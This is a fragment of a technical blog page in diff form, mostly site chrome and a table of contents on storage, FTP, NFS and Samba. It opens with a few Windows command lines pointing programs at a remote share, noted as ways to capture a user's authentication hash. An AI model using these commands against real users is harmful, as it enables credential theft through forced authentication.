error)</span></span><br><span class="line">mspaint.exe \\host\share\share.png <span class="comment">#(will capture hash, and display the remote PNG file to the user)</span></span><br><span class="line">msra.exe /openfile \\host\share <span class="comment">#(noisy, error)</span></span><br><span class="line">mstsc.exe \\host\share <span class="comment">#(noisy, error)</span></span><br><span class="line">netcfg.exe <span class="literal">-l</span> \\host\share <span class="literal">-c</span> p <span class="literal">-i</span> foo</span><br></pre></td></tr></table></figure>
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/07/05/2020-07-05-Format-String-Vulnerability-Intro/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Format String Vulnerability Intro</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/05/25/2020-05-25-About-Stealing-Credentials/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">About Stealing Credentials</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>&nbsp;-&nbsp;
+            
+            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">TyeYeah</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Storage"><span class="nav-number">1.</span> <span class="nav-text">Storage</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DAS"><span class="nav-number">1.1.</span> <span class="nav-text">DAS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NAS"><span class="nav-number">1.2.</span> <span class="nav-text">NAS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SAN"><span class="nav-number">1.3.</span> <span class="nav-text">SAN</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#File-Transfer-Protocol"><span class="nav-number">2.</span> <span class="nav-text">File Transfer Protocol</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Softwares"><span class="nav-number">2.1.</span> <span class="nav-text">Softwares</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Very-Secure-FTP-Daemon"><span class="nav-number">2.2.</span> <span class="nav-text">Very Secure FTP Daemon</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Network-File-System"><span class="nav-number">3.</span> <span class="nav-text">Network File System</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Softwares-1"><span class="nav-number">3.1.</span> <span class="nav-text">Softwares</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nfs-utils"><span class="nav-number">3.2.</span> <span class="nav-text">nfs-utils</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nfs-kernel-server-and-nfs-common"><span class="nav-number">3.3.</span> <span class="nav-text">nfs-kernel-server and nfs-common</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Samba"><span class="nav-number">4.</span> <span class="nav-text">Samba</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Server-Message-Block"><span class="nav-number">4.1.</span> <span class="nav-text">Server Message Block</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Common-Internet-File-System"><span class="nav-number">4.2.</span> <span class="nav-text">Common Internet File System</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Softwares-2"><span class="nav-number">4.3.</span> <span class="nav-text">Softwares</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Usage"><span class="nav-number">4.4.</span> <span class="nav-text">Usage</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
